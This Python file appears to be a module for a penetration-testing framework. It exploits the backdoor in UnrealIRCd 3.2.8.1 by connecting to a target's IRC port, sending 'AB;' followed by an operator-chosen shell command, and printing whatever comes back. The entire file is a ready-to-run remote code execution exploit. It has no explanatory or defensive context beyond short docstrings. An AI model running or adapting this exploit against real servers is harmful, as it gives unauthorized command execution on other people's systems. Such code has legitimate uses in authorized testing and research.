import socket
from core.base_module import BaseModule
from rich.console import Console

class UnrealIrcdBackdoor(BaseModule):
    """Exploits the UnrealIRCD 3.2.8.1 backdoor for RCE."""

    def get_options(self):
        """Returns the options for this module."""
        return {
            'RHOST': ['', 'The target IP address.'],
            'RPORT': [6667, 'The target port.'],
            'CMD': ['whoami', 'The command to execute on the target.']
        }

    def run(self, options):
        """Executes the UnrealIRCD backdoor exploit."""
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        console.print(f"[*] Connecting to {rhost}:{rport}...")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((rhost, rport))
                console.print("[*] Sending backdoor payload...")
                
                # The backdoor is triggered by sending 'AB' followed by a system command.
                payload = f"AB; {cmd}\n".encode()
                s.send(payload)
                
                # The response might not always be reliable, but we listen for a bit.
                try:
                    response = s.recv(4096).decode(errors='ignore')
                    console.print("[bold green][+] Payload sent. Command should have executed.[/bold green]")
                    if response:
                        console.print("--- Response Received ---")
                        console.print(response.strip())
                        console.print("-------------------------")
                    else:
                        console.print("[*] No direct response received. This is normal for some commands.")
                except socket.timeout:
                    console.print("[bold green][+] Payload sent. Command likely executed (no response received).[/bold green]")

        except socket.timeout:
            console.print("[!] Connection timed out. The target may not be vulnerable or reachable.", style="bold red")
        except ConnectionRefusedError:
            console.print("[!] Connection refused.", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")